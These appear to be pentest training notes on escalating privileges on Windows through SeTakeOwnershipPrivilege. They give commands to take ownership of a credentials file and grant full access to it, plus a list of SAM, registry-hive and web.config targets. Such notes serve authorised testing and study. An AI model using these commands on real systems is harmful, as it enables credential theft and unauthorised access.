GPO abuse: https://github.com/FSecureLABS/SharpGPOAbuse

SeTakeOwnershipPrivilege allows the user to take control of a shared folder or sensitive files such as a document containing passwords or an ssh key

## Leveraging the Privilege
```
whoami /priv
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```
- https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1

**Choosing a Target File
Note: this is risky. Ask permission from client as this may break things. Always revert changes. Tell client if not possible to revert.

**Checking File Ownership
```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

**Taking Ownership of the File
```
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

**Confirm Ownership Change
```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

**Modifying the File ACL
```
cat 'C:\Department Shares\Private\IT\cred.txt'
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
cat 'C:\Department Shares\Private\IT\cred.txt'
```

**Files of Interest
```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```
